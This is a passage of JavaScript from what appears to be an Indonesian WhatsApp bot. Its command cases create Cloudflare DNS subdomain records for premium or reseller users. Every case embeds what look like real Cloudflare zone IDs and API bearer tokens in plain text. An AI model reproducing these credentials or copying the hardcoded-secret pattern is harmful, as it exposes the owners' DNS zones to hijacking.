             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RafatharOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain41': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isPremium && !isOwner) return reply(mess.only.premium)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "433a5c33932fa9ae50165c9df5e15f0e";
               let apitoken = "qKl5LyFBfNJgnI8n4ZDbgiL65OQMkEJL8GgITWs9";
               let tld = "panel-zall.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RafatharOffcial⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain42': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain RafatharOffcial\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283183432282")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d4a6adffd3dd317753c4401e38cb7949";
               let apitoken = "oMSalNry5ByDu_PBJhTAxNOhQiYKjWQImKKDIhWh";
               let tld = "digital-market.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RafatharOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain43': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain RafatharOffcial\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283183432282")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e13ba8568f6e44ca927569da961d9eb6";
               let apitoken = "bTF2B2fQNe0nJL62gTuGQEbeZCEbOC0FpGWB-ESr";
               let tld = "rafatharofficial.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RafatharOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain44': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain RafatharOffcial\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283183432282")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "fb96c7c37f24377704b78f5cc41af7a5";
               let apitoken = "XL-sfJZLBRtXDxkZ9ElUuxTLTwi95P-z-Ei14pDt";
               let tld = "tokodigital.software";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RafatharOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain45': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
  if (!isPremium && !isOwner) return reply(mess.only.premium)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "f2fdc89319f657dcc383a21941a47352";
               let apitoken = "qKl5LyFBfNJgnI8n4ZDbgiL65OQMkEJL8GgITWs9";
               let tld = "agen-panell.tech";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RafatharOffcial⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain46': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isOwner) return reply('Maaf, domain ini hanya untuk pemilik.')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "eb040b2fa1975c2daf0df485c9b27f72";
               let apitoken = "0SQK6u0tkUJjSX9NU53x8W5RdN6oi5HI02OsLO6L";
               let tld = "privateyour.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain47': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "6cbcca73a1d2eadde62edfd18d29f65d";
               let apitoken = "8hA4i28Ulod0AoDA_wuWaHiKqAPh_tZ6b4kphQbn";
               let tld = "crazyyhosting.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain48': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "449f1bcf59520d9fd10f23f467ca029b";
               let apitoken = "2YqnpPSXIsHCJbv71nmsMNv-bbU4qkYRoz8FDlQN";
               let tld = "servershop.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain49': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isPremium && !isOwner) return reply(mess.only.premium)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "cacc799e17439b4757d1963ba63ff184";
               let apitoken = "qKl5LyFBfNJgnI8n4ZDbgiL65OQMkEJL8GgITWs9";
               let tld = "rumahpanel.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain49 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain50': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isPremium && !isOwner) return reply(mess.only.premium)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "079d5f563bfc1f1c45e380adbf73fa95";
               let apitoken = "qKl5LyFBfNJgnI8n4ZDbgiL65OQMkEJL8GgITWs9";
               let tld = "controlpanel.site";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain51': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isPremium && !isOwner) return reply(mess.only.premium)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e035e2ebcaf16e84e6bdfe6d64c0b7d1";
               let apitoken = "qKl5LyFBfNJgnI8n4ZDbgiL65OQMkEJL8GgITWs9";
               let tld = "sellerpanel.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain52': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isPremium && !isOwner) return reply(mess.only.premium)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "8ee0b4ef93c30c1c434a02babecdf3df";
               let apitoken = "qKl5LyFBfNJgnI8n4ZDbgiL65OQMkEJL8GgITWs9";
               let tld = "panelstoree.tech";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain53': {
    if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isPremium && !isOwner) return reply(mess.only.premium)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "52a4ed08947c21ff3e0f8834e2bc333b";
               let apitoken = "qKl5LyFBfNJgnI8n4ZDbgiL65OQMkEJL8GgITWs9";
               let tld = "toko-pannelmurah.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RafatharOffcial⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain54': {
        if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isPremium && !isOwner) return reply(mess.only.premium)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "6bd18a4ab072420e148f3c0c769bd380";
               let apitoken = "qKl5LyFBfNJgnI8n4ZDbgiL65OQMkEJL8GgITWs9";
               let tld = "vvip-pannel.online";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Rafathar Offcial⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
          break
          case 'domain55': {
        if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isPremium && !isOwner) return reply(mess.only.premium)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "082d880e4df98024ef1b01ba5e6ac6f0";
